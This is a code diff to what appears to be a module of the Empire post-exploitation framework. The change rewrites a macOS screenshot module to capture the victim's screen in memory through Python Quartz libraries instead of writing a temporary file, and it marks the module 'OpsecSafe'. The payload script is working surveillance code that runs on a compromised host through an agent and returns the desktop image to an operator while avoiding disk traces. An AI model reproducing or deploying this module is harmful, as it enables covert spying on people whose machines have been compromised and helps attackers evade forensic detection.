@@ -5,13 +5,13 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'Screenshot',
+            'Name': 'NativeScreenshot',
 
             # list of one or more authors for the module
-            'Author': ['@harmj0y'],
+            'Author': ['@xorrior'],
 
             # more verbose multi-line description of the module
-            'Description': ('Takes a screenshot of an OSX desktop using screencapture and returns the data.'),
+            'Description': ('Takes a screenshot of an OSX desktop using the Python Quartz libraries and returns the data.'),
 
             # True if the module needs to run in the background
             'Background': False,
@@ -23,7 +23,7 @@ class Module:
             'NeedsAdmin': False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': False,
+            'OpsecSafe': True,
 
             # the module language
             'Language' : 'python',
@@ -44,11 +44,6 @@ class Module:
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
-            },
-            'SavePath': {
-                'Description'   :   'Path of the temporary screenshot file to save.',
-                'Required'      :   True,
-                'Value'         :   '/tmp/out.png'
             }
         }
 
@@ -69,18 +64,25 @@ class Module:
 
     def generate(self):
 
-        savePath = self.options['SavePath']['Value']
-
         script = """
-# take a screenshot using screencapture
-run_command('screencapture -x /tmp/out.png')
-# base64 up resulting file, delete the file, return the base64 of the png output
-#   mocked from the Empire screenshot module
-f = open('%s', 'rb')
-data = f.read()
-f.close()
-run_command('rm -f %s')
-print data
-""" % (savePath, savePath)
+try:
+    import Quartz
+    import Quartz.CoreGraphics as CG
+    from AppKit import *
+    import binascii
+except ImportError:
+    print "Missing required module..."
+
+onScreenWindows = CG.CGWindowListCreate(CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID)
+desktopElements = Foundation.CFArrayCreateMutableCopy(None, 0, onScreenWindows)
+imageRef = CG.CGWindowListCreateImageFromArray(CG.CGRectInfinite, desktopElements, CG.kCGWindowListOptionAll)
+rep = NSBitmapImageRep.alloc().initWithCGImage_(imageRef)
+props = NSDictionary()
+imageData = rep.representationUsingType_properties_(NSPNGFileType,props)
+imageString = str(imageData).strip('<').strip('>>').strip('native-selector bytes of')
+hexstring = binascii.hexlify(imageString)
+hex_data = hexstring.decode('hex')
+print hex_data
+"""
 
         return script
